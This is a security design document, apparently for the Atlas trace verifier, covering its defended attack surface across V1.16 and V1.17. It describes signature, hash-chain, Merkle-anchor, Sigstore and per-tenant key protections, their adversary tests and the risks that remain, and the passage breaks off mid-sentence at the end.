# Atlas Verifier — Defended Attack Surface (V1.16 + V1.17)

This document describes what the V1.16 verifier (`atlas-trust-core`, exposed as
`atlas-verify-cli` and `atlas-verify-wasm`) actually defends against. It is
written for auditors and security reviewers who want to know "what does this
verifier protect, and where are the limits" without reading Rust.

If you are an auditor reading this for the first time: every claim below is
backed by an integration test in `crates/atlas-trust-core/tests/golden_traces.rs`,
a unit test in `crates/atlas-trust-core/src/`, or an issuer-side test in
`crates/atlas-signer/src/anchor.rs`. You can run them all with
`cargo test -p atlas-trust-core -p atlas-signer` against any clone.

---

## What the verifier guarantees

When `verify_trace(trace, bundle)` returns `valid: true`, the following hold:

1. **Schema match** — the trace's `schema_version` exactly equals the verifier
   build's `SCHEMA_VERSION`. Substring/prefix tricks (e.g. `"atlas-trace-v1-extended"`)
   are rejected, not accepted.
2. **Bundle pinning** — the trace claims `pubkey_bundle_hash` and the verifier
   has independently computed the same hash from the supplied pubkey bundle.
   Comparison is constant-time (`subtle::ConstantTimeEq`).
3. **Hash-chain integrity** — every event's claimed `event_hash` was recomputed
   by the verifier from the canonical signing-input bytes; the comparison is
   constant-time. Two events sharing an `event_hash` are rejected as a
   duplicate.
4. **Signature integrity** — every event was signed with `EdDSA` by the
   private key corresponding to its `kid`'s pubkey in the pinned bundle.
   `signature.alg` MUST equal `"EdDSA"`; any other value (including blank,
   `"none"`, `"RS256"`, etc.) is rejected without attempting to verify.
5. **Timestamp wellformedness** — every event's `ts` parses as RFC 3339.
   (V1 does NOT enforce monotonicity or maximum drift — see *Out of scope*.)
6. **DAG integrity** — every `parent_hash` referenced by any event resolves
   to some other event in the same trace; the computed DAG-tips match the
   server's claimed `dag_tips`.
7. **Workspace binding** — `workspace_id` is folded into the canonical
   signing-input alongside `event_id`, `ts`, `kid`, `parents`, and `payload`.
   An event signed inside workspace A cannot be replayed inside workspace B
   without breaking the hash check (cross-workspace replay defence).
8. **Anchor verification** — for every entry in `trace.anchors`, the
   verifier recomputes the RFC 6962-style Merkle inclusion proof from
   the leaf hash up to the claimed root and verifies the Ed25519
   checkpoint signature against a pinned log public key. The
   leaf-hash domain prefix (`leaf:` vs `node:`) prevents second-preimage
   attacks across tree levels. Two anchor kinds are recognised:
   `bundle_hash` (defends against post-hoc bundle swap) and `dag_tip`
   (defends against tail truncation or fork). Empty `anchors[]` passes
   by default (no claim is fine, but a false claim is not);
   `VerifyOptions::require_anchors` strict mode demands at least one
   anchor and that every `dag_tip` be covered by a `dag_tip` anchor.

---

## Wire-format determinism

The signing-input is encoded as deterministic CBOR per RFC 8949 §4.2.1
("Core Deterministic Encoding"):

- Map keys are sorted by **encoded-key length first**, then bytewise lex.
  (Pure lex sort, the previous V0 behaviour, diverges from §4.2.1 once
  keys of mixed length appear.)
- Floats are **rejected** at the canonicaliser boundary. Float encoding is
  not deterministic across CBOR variants and not stable across float
  libraries. Callers must use bounded integer encodings (e.g. basis points)
  for fractional values. The bank demo encodes `training_loss = 0.0814`
  as `training_loss_bps = 814`.
- Per-level item count is bounded by `MAX_ITEMS_PER_LEVEL = 10_000`,
  capping `Vec::with_capacity` allocation under hostile input.
- All wire-format structs (`AtlasTrace`, `AtlasEvent`, `EventSignature`,
  `AnchorEntry`, `TraceFilters`, `PeriodFilter`) carry
  `#[serde(deny_unknown_fields)]`. Unknown fields fail the parse.

Three pinned anti-drift properties lock the trust model at the build
step:

- `crates/atlas-trust-core/src/cose.rs::signing_input_byte_determinism_pin`
  locks the exact CBOR bytes of the per-event signing-input for a known
  input. Any unintentional change to the canonicalisation pipeline —
  including a `ciborium` upgrade that subtly changes encoding — trips
  this test before the WASM/native split can reach a customer's browser.
- `crates/atlas-trust-core/src/pubkey_bundle.rs::bundle_hash_byte_determinism_pin`
  locks the exact blake3 hex of `PubkeyBundle::deterministic_hash` for a
  known bundle. The bundle hash is the *second* load-bearing identity in
  the trust model: it is what a trace claims via `pubkey_bundle_hash` to
  bind itself to a specific keyset. If the canonicalisation drifts
  (a `serde_json` upgrade altering `Number::to_string()`, a whitespace
  tweak, a key-sort regression), historic bundles silently stop matching
  new builds — exactly the "silent rotation" threat Atlas is built to
  prevent. This pin trips first.
- `crates/atlas-signer/src/anchor.rs::mock_log_pubkey_matches_signer_seed`
  asserts that the issuer-side `MOCK_LOG_SEED` and the verifier-side
  pinned `MOCK_LOG_PUBKEY_HEX` derive to the same Ed25519 keypair.
  Touching one without the other fails CI — preventing the silent class
  of bug where the issuer rolls a new key but the verifier still pins
  the old one (or vice-versa). V1.6 adds analogous pins for the live
  Sigstore path (see below).

All three pins enforce the same contract: changing them requires a
crate-version bump so the `VERIFIER_VERSION` cascade propagates and
old-format inputs are rejected with a clean schema error rather than
silently misverifying.

---

## Adversary tests

Each of the following is an integration test in
`crates/atlas-trust-core/tests/golden_traces.rs`:

| Test | Adversary intent |
|---|---|
| `cross_workspace_replay_rejected` | Trace signed for workspace A, presented as workspace B → hash mismatch |
| `anchor_with_bogus_proof_is_rejected` | Trace claims an anchor whose Merkle proof does not reconstruct to the signed checkpoint root → ✗ INVALID |
| `wrong_alg_rejected` | `signature.alg = "RS256"` (downgrade attempt) |
| `non_rfc3339_timestamp_rejected` | `ts = "yesterday at noon"` |
| `duplicate_event_hash_rejected` | Two events share the same `event_hash` (replay collision) |
| `dag_tip_mismatch_rejected` | Trace claims a tip the events do not produce |
| `schema_version_prefix_attack_rejected` | `schema_version = "atlas-trace-v1-extended"` (substring trick) |
| `empty_pubkey_bundle_rejected` | Bundle with zero keys → first event's kid is unknown |
| `bundle_hash_mismatch_rejected` | Trace was signed against a different bundle than the verifier holds |
| `tampered_payload_detected` | Payload mutated after signing |
| `unknown_kid_detected` | Bundle missing the kid the event claims |
| `schema_mismatch_detected` | `schema_version = "atlas-trace-v999"` |

Plus unit-level adversary tests across `cose.rs`, `hashchain.rs`,
`pubkey_bundle.rs`, and `anchor.rs` (float rejection, RFC 8949 sort,
dangling-parent, key-insertion-order independence, byte-pinned bundle
hash, RFC 6962 audit-path-length conformance, leaf-hash domain
separation, checkpoint-bytes stability).

Issuer-side adversary tests live in
`crates/atlas-signer/src/anchor.rs`:

| Test | Adversary intent |
|---|---|
| `tampered_anchored_hash_fails` | Anchor entry's `anchored_hash` is mutated post-issuance → verifier-side proof check fails |
| `mock_log_pubkey_matches_signer_seed` | Issuer seed and verifier-pinned log pubkey would silently drift → CI breaks before either reaches main |
| `round_trip_single_leaf` | Single-leaf tree: leaf is the root, audit path is empty, verifier accepts |
| `mixed_kinds_round_trip` | One batch with mixed `bundle_hash` + `dag_tip` kinds verifies under one shared checkpoint |
| `round_trip_seven_leaves_every_index` | Non-power-of-two tree, every leaf index verifies against the same root |

---

## Sigstore anchoring (V1.6 — in scope)

V1.6 ships live Sigstore Rekor v1 submission with the same offline-complete
verification path as V1.5 mock-Rekor. The verifier validates both formats
by log_id dispatch:

- **Atlas anchoring key drift:** `crates/atlas-signer/src/anchor.rs::atlas_anchor_pubkey_pem_is_pinned`
  pins the ECDSA P-256 pubkey derived from `ATLAS_ANCHOR_SEED`. Touching
  the seed or the derivation without updating the pin fails CI.
- **Sigstore Rekor v1 production pubkey pin:** `crates/atlas-trust-core/src/anchor.rs::SIGSTORE_REKOR_V1_PEM`
  is the fixed ECDSA P-256 SPKI key (fetched from
  `https://rekor.sigstore.dev/api/v1/log/publicKey` on 2026-04-28).
  `SIGSTORE_REKOR_V1_LOG_ID` is SHA-256(DER bytes). Any anchor with a
  mismatched log_id is rejected before proof work.
- **apiVersion pin:** `entry_body_binds_anchored_hash` asserts
  `apiVersion == "0.0.1"` — any other value is rejected at verify time.
- **Trillian tree-ID pin:** `SIGSTORE_REKOR_V1_ACTIVE_TREE_ID` pins the
  active shard (`1_193_050_959_916_656_506`). An anchor whose tree_id
  does not match is rejected before ECDSA signature verify.
- **keyID rotation handling:** The C2SP signed-note may carry multiple
  signature lines (one per keyID rotation). The verifier iterates the
  lines, extracting the 4-byte keyID from each; if the keyID matches the
  pinned Sigstore log's `SIGSTORE_REKOR_V1_KEY_ID`, verify the signature.
  Mismatch is `continue` (not error); success when ONE line verifies.
  Tested in `crates/atlas-trust-core/tests/sigstore_golden.rs`.
- **HTTP client validation:** `RekorClient::new` in
  `crates/atlas-signer/src/rekor_client.rs` enforces: HTTPS required for
  non-loopback hosts; plaintext http:// gated to localhost/127.0.0.1/[::1]
  for wiremock testing only.
- **Cross-format hash derivation:** `sigstore_anchored_hash_for(kind, blake3_hex)`
  derives the SHA-256 that Rekor's hashedrekord entry binds, with domain
  prefix by kind (`atlas-dag-tip-v1:` / `atlas-bundle-hash-v1:`). Single-sourced
  in Rust so issuer and verifier produce identical bytes. Pinned in a
  unit test to prevent silent logic drift.
- **Real Sigstore entry round-trip:** `crates/atlas-trust-core/tests/sigstore_golden.rs::verifies_real_sigstore_rekor_entry`
  tests against a captured production entry from the live Sigstore Rekor
  v1 log (logIndex 800000000, Trillian treeID 1_193_050_959_916_656_506).
  Full pipeline: entry body decodes, leaf hash recomputes, 31-deep audit
  path reaches claimed root under SHA-256 RFC 6962, C2SP signed-note ECDSA
  verify succeeds against the pinned production key.

## Anchor-chain tip-rotation (V1.7 — in scope)

V1.7 ships anchor-chain tip-rotation with the same offline-complete verification
as V1.5/V1.6 anchoring. New threats and mitigations:

- **Anti-rewrite property:** The chain head is the load-bearing hash. Any silent
  mutation of a past `AnchorBatch` changes the head and breaks verification.
  `verify_anchor_chain` refuses to walk past the first `previous_head` mismatch —
  short-circuits on tampering rather than walking and lying. An auditor with the
  chain can establish with certainty that no past batch has been silently rewritten.
  Tested via 15 adversary tests in `crates/atlas-trust-core/tests/anchor_chain_adversary.rs`:
  reorder, gap, head mismatch, coordinated rewrite, previous_head break, etc.
- **Mixed-mode safety (V1.8 carve-out):** From V1.8, both mock and Sigstore
  paths extend the chain. The coverage check classifies each entry as covered
  (in chain history), Sigstore-deferred (Sigstore `log_id` and absent from
  history — accepted on the basis of Sigstore Rekor v1's own publicly-witnessed
  log providing equivalent monotonicity), or uncovered (any other absence —
  rejected). A non-Sigstore anchor that is not in chain still fails coverage,
  preserving the V1.7 anti-rewrite property for the mock path. Per-entry
  verification (`verify_anchors`) runs unconditionally against the pinned PEM
  before coverage, so a forged Sigstore `log_id` cannot bypass anything: the
  inclusion proof and checkpoint signature must still verify. Tested via
  `sigstore_anchor_not_in_chain_accepted_by_coverage`,
  `mixed_mode_mock_in_chain_plus_sigstore_deferred`, and
  `non_sigstore_anchor_not_in_chain_still_rejected` in
  `crates/atlas-trust-core/tests/anchor_chain_adversary.rs`.
- **Chain-file integrity:** The issuer is the sole writer of `anchor-chain.jsonl`
  (append-only, atomic tmp-and-rename). Corruption is caught at parse time if the
  file is modified out-of-band. Loss of the chain file breaks the trust property
  for future anchors in that workspace (operator would need to run a rotation
  ceremony to bridge to a new chain). Documented in `apps/atlas-mcp-server/README.md`.
- **Lenient mode (backwards compatible):** Old V1.5/V1.6 bundles lack the chain.
  The verifier's lenient default (`require_anchor_chain = false`) passes them;
  strict mode (`require_anchor_chain = true`) demands a present, valid chain.
  Existing golden traces and integration tests continue to pass without modification.
## Precision-preserving anchor JSON pipeline (V1.8 — in scope)

V1.8 closes a precision-loss gap that V1.7 sidestepped via the Sigstore-path
chain-extension gate. The trust property at stake is byte-identical chain heads
between issuer and offline auditor: a silent digit loss anywhere in the
pipeline diverges the heads and breaks audit-by-mail.

- **Lossless boundary:** The MCP server routes every signer-stdout boundary
  (`signEvent`, `anchorViaSigner`, `chainExportViaSigner`) and on-disk parse
  (`anchors.json`, `anchor-chain.jsonl`) through `lossless-json` via the
  helper `apps/atlas-mcp-server/src/lib/anchor-json.ts`. Integer literals in
  safe range stay native `number`; oversized integers, fractionals, and
  scientific-notation literals wrap as `LosslessNumber` whose `.value`
  preserves the source string. `stringifyAnchorJson` re-emits wrappers
  verbatim so the round-trip is byte-identical.
- **Defensive number parser:** `1.193e18` happens to be an integer-valued
  double, so a naive `isSafeNumber`-only gate would let it pass
  `z.number().int()`. The custom parser forces every non-integer literal
  through `LosslessNumber`, where the schema's regex check rejects it. This
  defends against a hypothetical signer drift toward scientific notation —
  exactly the silent-precision-loss class V1.8 is closing.
- **Schema-side magnitude bound:** `LosslessIntegerSchema` validates the
  digit string with `/^(?:0|[1-9]\d*)$/` (non-negative, no leading zeros)
  AND a 19-digit ceiling (i64 magnitude). A crafted anchor entry carrying a
  500-digit literal fails at the Zod boundary with a descriptive error
  rather than later as a cryptic Rust deserialization overflow.
- **Sigstore-path chain extension re-enabled:** The V1.7 gate in
  `apps/atlas-mcp-server/src/tools/anchor-bundle.ts` (`rekorUrl === undefined`
  conditional) is removed. Both paths now extend `anchor-chain.jsonl`. The
  signer remains the sole writer; atomic append unchanged.
- **Coverage carve-out:** See "Mixed-mode safety (V1.8 carve-out)" above.
  V1.7-issued bundles (Sigstore anchors not in chain) keep verifying.
- **Tested via:** `apps/atlas-mcp-server/scripts/test-anchor-json.ts` (5
  tests: oversized parse, safe-range integer, round-trip, scientific-notation
  rejection, array round-trip) plus the Rust adversary tests cited above.

## Sigstore shard roster (V1.7 — in scope)

V1.7 expands the Sigstore verifier to accept multiple shards (active + historical)
while maintaining the same single-key trust property:

- **Roster membership check:** Replaces strict tree-ID equality (`SIGSTORE_REKOR_V1_ACTIVE_TREE_ID == entry.tree_id`)
  with membership check (`is_known_sigstore_rekor_v1_tree_id(entry.tree_id)`). The roster
  is a pinned constant `SIGSTORE_REKOR_V1_TREE_IDS: &[i64] = &[1_193_050_959_916_656_506, 3_904_496_407_287_907_110, 2_605_736_670_972_794_746]`.
  Tested via `sigstore_tree_id_roster_is_pinned` and `known_sigstore_tree_id_membership` unit tests.
- **Same-key trust property:** The pinned ECDSA P-256 pubkey (`SIGSTORE_REKOR_V1_PEM`)
  is unchanged across all three shards. Signature verification depends only on this
  single key. An attacker cannot exploit per-shard keys because there is only one
  pinned key.
- **No cross-shard replay:** The C2SP signed-note origin line embeds `tree_id`
  (rekor.sigstore.dev origin is reconstructed from caller-supplied `entry.tree_id`).
  Verifying a checkpoint signed for tree_id A against a submitted entry claiming
  tree_id B fails at signature verify because the reconstructed origin differs.
  Cross-shard replay is structurally impossible. Tested via `historical_shard_tree_id_passes_dispatch_gate`
  and `unknown_tree_id_is_rejected` integration tests in `tests/sigstore_golden.rs`.
- **Roster is a source change:** Adding new tree-IDs requires a crate version bump.
  Silent acceptance of unknown tree-IDs is forbidden. If a future Sigstore shard
  rotation introduces a new tree-ID, that is a published update to Atlas requiring
  a source rebuild.
- **Issuer asymmetry:** The issuer still posts only to the active shard. This is
  intentional: verifier accepts historical (backwards compatibility), issuer
  produces current (forward progress). Operator who upgrades gets free backwards
  compatibility without operator action.

The following are **not** defended in V1.7, and a `valid: true` outcome
does NOT imply them:

- **Timestamp monotonicity / drift bounds.** The verifier checks that `ts`
  parses as RFC 3339 and nothing more. Future-timestamps and out-of-order
  events both pass V1.7.
- **Cedar policy enforcement.** Trace bundles list `policies[]` but V1.7
  does not evaluate them.
- **SPIFFE attestation.** `kid` strings of the form `spiffe://...` are
  treated as opaque keys-of-id. SVID validation against an in-domain
  trust bundle is not implemented.
- **Master-seed compromise still compromises every workspace.** V1.9
  ships per-tenant *workspace* keys derived from a single master seed
  (see "Per-tenant Atlas anchoring keys (V1.9)" below); this removes
  the single-key blast radius for *workspace* keys, but the master seed
  itself is the new single point of failure. V1.10 closes this with
  HSM/TPM sealing of the master seed.
- **`DEV_MASTER_SEED` is a source-committed constant.** The dev master
  seed in `crates/atlas-signer/src/keys.rs` is fixed across builds for
  reproducibility. Any production deployment MUST configure the V1.10
  wave-2 sealed-seed loader (set the HSM trio
  `ATLAS_HSM_PKCS11_LIB` / `ATLAS_HSM_SLOT` / `ATLAS_HSM_PIN_FILE`
  and build with `--features hsm`) and leave `ATLAS_DEV_MASTER_SEED`
  unset. (V1.9 historically gated the dev seed via
  `ATLAS_PRODUCTION=1`; V1.12 removed that var — the wave-2 HSM trio
  is now the production audit signal.)
- **Side-channel attacks beyond hash equality.** Constant-time compare
  is wired on hash and bundle-hash equality. Other code paths (CBOR
  encoding, JSON parsing, Merkle proof recomputation) make standard
  branching choices.

---

## Per-tenant Atlas anchoring keys (V1.9 — in scope)

V1.9 ships per-tenant Atlas anchoring keys: each workspace's events are
signed by an Ed25519 keypair derived from a single master seed via
HKDF-SHA256, with the workspace_id bound into the HKDF `info`
parameter. The verifier consumes the resulting public key from the
`PubkeyBundle` under a kid of shape `atlas-anchor:{workspace_id}` and
makes no network call.

- **Per-workspace key separation:** `atlas_trust_core::per_tenant`
  pins the kid prefix at `"atlas-anchor:"` and exposes
  `per_tenant_kid_for(workspace_id)` and `parse_per_tenant_kid(kid)` as
  the only kid-shape APIs. The HKDF *derivation* itself lives in
  `atlas-signer::keys` (`derive_workspace_signing_key`) — the verifier
  never sees the master seed and cannot re-derive any workspace's
  secret. Compromise of one workspace's signing key does not compromise
  others (HKDF is one-way per `info` string).
- **Domain-separation prefix is the trust boundary:** The HKDF `info`
  parameter is `"atlas-anchor-v1:" || workspace_id`. The
  `-v1` is a future-rotation tag — bumping it produces a disjoint key
  set without re-using the same `(ikm, info)` pair. The
  *issuer-side* HKDF info-prefix (`atlas-anchor-v1:`) is intentionally
  distinct from the *verifier-side* kid prefix (`atlas-anchor:`); they
  serve different purposes and sit on different sides of the trust
  boundary.
- **Pinned pubkey goldens:** `crates/atlas-signer/src/keys.rs::workspace_pubkeys_are_pinned`
  pins the base64url-no-pad public key for two workspace_ids
  (`alice`, `ws-mcp-default`) derived from `DEV_MASTER_SEED`. Any
  change to the master seed, the HKDF info-prefix, the curve, or the
  encoder trips this test before silently rotating production keys.
  Pinning two distinct ids defends against a degenerate change that
  happened to leave one workspace stable but broke others.
- **Strict mode (`VerifyOptions::require_per_tenant_keys`):** A
  V1.9-issued bundle should verify under strict mode, which demands
  every event's `kid` equal `format!("atlas-anchor:{trace.workspace_id}")`.
  Mixed legacy + per-tenant kids are rejected. Lenient mode (the
  default for V1.5–V1.8 backwards compatibility) accepts both.
  **Caveat — lenient is not a free win:** an attacker who can downgrade
  a workspace's bundle to legacy form bypasses per-tenant isolation.
  Strict mode is the real security boundary for V1.9-issued data;
  document the gap.
- **Production gate (V1.9 — superseded by V1.10, removed in V1.12):**
  All V1.9 per-tenant subcommands (`derive-key`, `derive-pubkey`,
  `rotate-pubkey-bundle`, and `sign --derive-from-workspace`) called
  `keys::production_gate()`, which refused to run when
  `ATLAS_PRODUCTION=1` was set. V1.9 had no sealed-seed loader; the
  gate ensured a production environment could not silently sign with
  the source-committed dev master seed. The opt-out shape was a
  footgun (residual #6 below): forgetting the env var let the dev
  seed through. V1.10 superseded this with a positive opt-in
  `keys::master_seed_gate()` — see *Master-seed gate inversion (V1.10)*
  below. V1.11 layered a deprecation warning on `ATLAS_PRODUCTION`,
  and **V1.12 removed both the gate function and the warning entirely**:
  the env var is silently ignored from V1.12 onwards. The V1.10
  positive opt-in is now the sole dev-seed gate.
- **Workspace_id ingress validation:** `keys::validate_workspace_id`
  rejects empty strings, non-ASCII-printable bytes (control chars,
  Unicode confusables), and the `:` delimiter. The verifier itself
  (`parse_per_tenant_kid`) is intentionally lenient — the trust
  property holds for any UTF-8 string via byte-exact kid comparison —
  so the policy lives in one place on the issuer side, where ambiguous
  IDs become operator footguns rather than verifier bypasses.
- **Signer-internal derivation (no secret in Node memory):** The MCP
  hot path uses `atlas-signer sign --derive-from-workspace <ws>`,
  which derives the per-tenant secret inside the signer process and
  signs without ever emitting it. The TS server never holds the
  per-tenant signing key. Bundle assembly uses `atlas-signer
  derive-pubkey` (public key only, secret never crosses the subprocess
  boundary). The `derive-key` subcommand — which DOES emit the secret —
  is reserved for ceremonies (rotation, key inspection) and gated by
  the same production gate.
- **Adversary tests:** 11 adversary cases in
  `crates/atlas-trust-core/tests/per_tenant_keys_adversary.rs`:
  per-tenant kid passes strict + lenient; legacy kid rejected in
  strict; cross-workspace forgery rejected (bob's events submitted as
  alice's); per-tenant-with-wrong-workspace rejected even when the
  signature itself is structurally valid; mixed legacy + per-tenant
  rejected in strict; per-tenant evidence row absent in lenient;
  tampered bundle hash with valid per-tenant kid still rejected
  (strict-mode kid acceptance must not bypass bundle integrity);
  zero-event trace under strict does not crash and emits a vacuous-ok
  evidence row; cross-bundle kid reuse rejected (alice's kid pasted
  into ws-bob's bundle).

### Residual risks (V1.9)

- **Master-seed exfiltration is full compromise.** HKDF is one-way
  per-`info`, so leaking workspace A's derived secret doesn't help an
  attacker forge for workspace B. Leaking the *master seed* derives
  every workspace's key — full compromise. V1.10 closes this with
  HSM/TPM sealing.
- **Lenient-mode downgrade.** A V1.9 verifier in lenient mode accepts
  both legacy and per-tenant bundles. An attacker who can downgrade a
  workspace's bundle to legacy form bypasses per-tenant isolation.
  Strict mode (`require_per_tenant_keys = true`) is the real V1.9
  security boundary.
- **Bundle migration during rotation is not transactional.** The
  `rotate-pubkey-bundle` subcommand reads from stdin and writes to
  stdout — atomic file replace and inter-operator concurrency are the
  caller's responsibility. See `docs/OPERATOR-RUNBOOK.md` for the
  ceremony.
- **`DEV_MASTER_SEED` ships with the source.** V1.10 wave 2 ships the
  sealed-seed loader (`crate::hsm::pkcs11::Pkcs11MasterSeedHkdf`,
  PKCS#11 backend, gated behind the `hsm` Cargo feature). Production
  deployments configure the HSM trio (`ATLAS_HSM_PKCS11_LIB`,
  `ATLAS_HSM_SLOT`, `ATLAS_HSM_PIN_FILE`) so the master seed lives
  only inside the token; the source-committed constant is then
  unreachable from the production code path. Dev/CI deployments that
  cannot run an HSM continue to fall through to V1.10 wave 1's
  positive opt-in (`ATLAS_DEV_MASTER_SEED=1` required to admit the
  dev seed). V1.12 removed the V1.9-era `ATLAS_PRODUCTION` paranoia
  layer that V1.10–V1.11 carried alongside the opt-in — the
  positive opt-in is now the sole dev-seed gate. See
  *Master-seed gate inversion (V1.10)* below for the gate's
  audit semantics.
- **Master-seed rotation invalidates every historical
  `pubkey_bundle_hash`.** A workspace's per-tenant pubkey is a
  deterministic function of `(master_seed, workspace_id)`. Rotating
  the master seed produces a new pubkey for every workspace, which
  means every previously-issued `PubkeyBundle` derives to a different
  `deterministic_hash` after the rotation, which means every
  historical trace's `pubkey_bundle_hash` field no longer matches the
  bundle the verifier would build today. **Auditors verifying
  pre-rotation traces must verify them against the
  pre-rotation pubkey bundle** — the rotation does not break those
  traces' trust properties, but it does break drop-in re-verification
  against a today-built bundle. Operators who rotate must archive the
  pre-rotation `PubkeyBundle` alongside any pre-rotation trace they
  intend to honour for audit, and ensure auditors receive the
  bundle-of-issuance, not the bundle-of-now. V1.10's sealed-seed loader
  inherits this property: rotating the *sealed* seed has the same
  effect as rotating the source-committed dev seed.
- **[CLOSED in V1.10, V1.9 paranoia layer REMOVED in V1.12] The
  production gate is opt-out, not opt-in.**
  V1.9 shipped `production_gate()` as a *negative* guard — it blocked
  per-tenant signing only when `ATLAS_PRODUCTION=1` was explicitly
  set. A production deployment that forgot to set the env var would
  run happily with the source-committed `DEV_MASTER_SEED` and emit
  signed events whose pubkeys an auditor could re-derive from public
  source. V1.10 wave 1 inverts this footgun: per-tenant subcommands
  refuse to start unless `ATLAS_DEV_MASTER_SEED=1` is *positively
  asserted*. A deployment that forgets the env var now fails closed
  with an actionable error, not "happily signs with public-source
  keys". V1.10–V1.11 preserved the V1.9 `ATLAS_PRODUCTION=1` check
  as a defence-in-depth inner layer; V1.12 removed it (the
  positive opt-in covers the same security property without the
  literal-`"1"`-only footgun). See *Master-seed gate
  inversion (V1.10)* below.

---

## Master-seed gate inversion (V1.10 — in scope; V1.12-simplified)

V1.10 wave 1 closes the V1.9 footgun where forgetting
`ATLAS_PRODUCTION=1` silently allowed the source-committed
`DEV_MASTER_SEED` to sign production traffic. The gate is now
positive: per-tenant subcommands refuse to start unless an explicit
dev opt-in is wired.

- **Single check (V1.12-simplified):** `keys::master_seed_gate()`
  consults `ATLAS_DEV_MASTER_SEED` only. A deployment with
  `ATLAS_DEV_MASTER_SEED=1` set obtains a `DevMasterSeedHkdf`;
  anything else refuses. V1.10–V1.11 layered the V1.9
  `ATLAS_PRODUCTION=1` paranoia check ahead of the opt-in for
  defence-in-depth; **V1.12 removed that layer** because (a) its
  literal-`"1"`-only recognition was a documented operator footgun,
  (b) the positive opt-in covers the same security property without
  the footgun, and (c) the wave-2 HSM trio is now the production
  audit signal. The two `ATLAS_DEV_MASTER_SEED` outcomes (set to a
  recognised truthy value, or anything else) are enumerated in
  `docs/OPERATOR-RUNBOOK.md` §1 with the security outcome.
- **Strict allow-list, not "anything truthy":** The gate accepts the
  values `1`, `true`, `yes`, `on` (ASCII case-insensitive,
  surrounding whitespace tolerated) and refuses anything else,
  including typos like `tru` / `yse` / `yeah` and adjacent values
  like `2` / `-1` / `enabled`. Tested by
  `master_seed_gate_refuses_typos_and_unknown_values`,
  `master_seed_gate_allows_recognised_truthy_values`,
  `master_seed_gate_truthy_values_are_case_insensitive`,
  `master_seed_gate_tolerates_surrounding_whitespace`. Rationale:
  V1.9's literal-`"1"` check would have silently rejected `"true"`
  on the wrong side of the boundary; V1.10 picks the conservative
  middle ground that mirrors operator mental models (the same
  boolean-style values that systemd, Docker, and Kubernetes config
  files accept) without admitting unbounded inputs.
- **Trait-routed derivation:** Per-tenant subcommands now go through
  `derive_workspace_signing_key_via<H: MasterSeedHkdf + ?Sized>` and
  `per_tenant_identity_via<H>`. The `&dyn MasterSeedHkdf` dispatch
  surface is dyn-safe (`&self`, no generics, no `Self` returns, no
  `async fn`), and V1.10 wave 2 (shipped in this milestone) drops
  in `Box<dyn MasterSeedHkdf>` from `master_seed_loader` for the
  sealed-seed path without changing callers — every per-tenant
  subcommand routes through the same `_via` helpers regardless of
  backend. The buffer-out shape
  (`derive_for(info, out: &mut [u8; 32])` rather than `-> [u8; 32]`)
  is zeroize-friendly: sealed implementations can wipe scratch
  space on error/drop without forcing a Drop wrapper around an
  owned array.
- **Pinned pubkey hashes preserved through abstraction:** The
  `workspace_pubkeys_are_pinned` golden test continues to pass
  against the trait-routed derivation; alice
  (`HaADbOvQvGRNVJnGFLLjj-qxC-zwReufz-8dAbBu9aY`) and ws-mcp-default
  (`_7VayPxHeadNxfSOw0p8E5LNXBNP2Mb-cOieCZRZq6M`) produce
  byte-identical Ed25519 pubkeys to V1.9. The smoke pubkey-bundle
  hashes (`0edbb1cfb191783a` / `80e85db603327c6e`) are unchanged.
  Refactoring the derivation pipeline cannot silently rotate keys:
  any byte drift trips the pin before reaching a customer.
- **Trust property — the env var is a deployment audit signal.**
  Auditors reviewing a deployment can request the env truth-table
  snapshot (`env | grep ATLAS_`) and conclude with certainty
  whether the process is signing under the source-committed dev
  seed or under the V1.10 wave-2 PKCS#11 sealed seed. The HSM trio
  (`ATLAS_HSM_PKCS11_LIB`, `ATLAS_HSM_SLOT`, `ATLAS_HSM_PIN_FILE`)
  is the deployment-time signature of sealed-seed mode; partial
  trios refuse to start, so a host snapshot showing all three set
  AND `ATLAS_DEV_MASTER_SEED` unset AND the binary built with
  `--features hsm` is the production-ready signature.
- **Adversary tests:** unit tests in
  `crates/atlas-signer/src/keys.rs` cover the gate's allow-list,
  V1.12 ignore semantics for `ATLAS_PRODUCTION` (the var must NOT
  refuse the dev seed under any value once the opt-in is set —
  pinned by `master_seed_gate_ignores_atlas_production_v1_12` and
  `master_seed_loader_ignores_atlas_production_v1_12`),
  error-message stability, trait dispatch through `&dyn`,
  equivalence between the trait-routed and explicit-seed paths,
  and Send+Sync witness on `DevMasterSeedHkdf`. The MCP smoke test
  (`pnpm --filter atlas-mcp-server smoke`) sets
  `ATLAS_DEV_MASTER_SEED=1` once at the top of `main()` so CI
  exercises the same gate operators do, and the bundle hashes
  remain pinned at the same goldens as V1.9.

### Residual risks after V1.10 wave 2

V1.10 wave 2 (HSM PKCS#11 sealing) has shipped. The wave-1 residual
risks below are now mitigated **for deployments that configure the
HSM trio**; dev/CI deployments running with
`ATLAS_DEV_MASTER_SEED=1` retain the V1.9-equivalent risk profile
spelled out in *Master-seed exfiltration is full compromise* above.

- **Dev seed remains source-committed for opt-in callers.** The HSM
  loader is the production path; the dev impl is the explicit
  fall-through when the HSM trio is unset and `ATLAS_DEV_MASTER_SEED=1`.
  The gate cannot prevent an operator from deliberately running the
  dev seed in a production-adjacent environment by setting the
  opt-in — the opt-in env var is itself the audit signal that flags
  such hosts.
- **Master-seed exfiltration in HSM mode is bounded by the device.**
  The wave-2 [`Pkcs11MasterSeedHkdf`](../crates/atlas-signer/src/hsm/pkcs11.rs)
  performs HKDF inside the HSM via `CKM_HKDF_DERIVE` and reads back
  only the 32-byte derived secret as an ephemeral
  `CKO_SECRET_KEY`/`CKK_GENERIC_SECRET` object — destroyed on every
  derive path so the derived bytes do not outlive the
  `derive_for` call. The master seed itself never enters Atlas
  address space. The residual risks are then the threat model
  documented in `docs/OPERATOR-RUNBOOK.md` §2: physical HSM
  compromise (token + PIN), malicious code injected into
  `atlas-signer` during a session's lifetime, HSM-driver compromise,
  and **TOCTOU on the PKCS#11 module path** between config-parse
  (where the V1.10 absolute-path guard fires) and the loader's
  `dlopen(3)` call (where filesystem state at the absolute path is
  not held). None of these are crypto-protocol weaknesses; they
  are operational controls (filesystem ACLs on
  `${ATLAS_HSM_PKCS11_LIB}` AND its parent directories — the
  TOCTOU bullet in the runbook elevates this from "nice-to-have"
  to "required control" — short-lived signer invocations, vendor
  module signing).
- **Dev-mode exfiltration is unchanged from V1.9.** A deployment
  running with `ATLAS_DEV_MASTER_SEED=1` and no HSM trio reads
  `DEV_MASTER_SEED` directly; anyone with read access to process
  memory of a derive-key / sign call sees the per-tenant Ed25519
